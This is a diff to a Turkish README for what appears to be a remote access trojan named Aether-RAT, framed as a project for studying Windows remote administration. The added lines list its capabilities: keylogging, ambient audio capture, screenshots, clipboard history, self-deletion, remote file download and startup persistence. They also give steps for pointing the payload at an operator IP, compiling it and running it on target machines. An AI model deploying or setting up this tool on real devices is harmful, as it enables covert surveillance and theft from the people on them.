@@ -30,6 +30,50 @@ Dokümantasyon | Tamamlandı
 Test süreçleri | Planlanıyor
 
 
+## Özellikler
+
+- 5 saniye ortam dinlemek (TEST EDİLMEDİ)
+- Anlık ekran görüntüsü
+- Pano geçmişini görüntüle
+- Klavye girdi günlüğü
+- Anlık süreç ağacı
+- Kendisini silmek
+- Dışardan harici dosyalar indirmek (TEST EDİLMEDİ)
+- Dosya yöneticisi
+- Özel komut girmek (Örn. programı yeniden başlatmalara eklemek vb.)
+
+## Kurulum
+
+```bash
+git clone https://github.com/drhakoo-beep/Aether-RAT
+
+cd Aether-RAT
+```
+
+Daha sonra
+
+```bash
+nano program.cs
+```
+
+Komutundan sonra kod içindeki "SİZİN_İP_ADRESİNİZ" yazan yere IP adresinizi yazın. (Örn: 192.168.0.16)
+
+## Çalıştırma
+
+```bash
+python main.py
+```
+
+Şimdi tarayıcınızdan localhost:8080 adresine gidiniz.
+
+Panel açıldıktan sonra, program.cs dosyanızı .exe formatında derleyiniz.
+
+Derlendikten sonra sanal makinanıza veya izinli olduğunuz cihazlara flaşbellek vb. yöntemlerle .exe programına çift tıklayın ve artık hazırsınız.
+
+Panelde sayfayı yenileyin ve cihaz isminin göründüğünü görebilirsiniz, üstüne tıklayın.
+
+-Tebrikler! Artık hazırsınız
+
 ## Projenin Amacı
 
 - Windows sistemlerinin uzaktan yönetim mimarisini incelemek
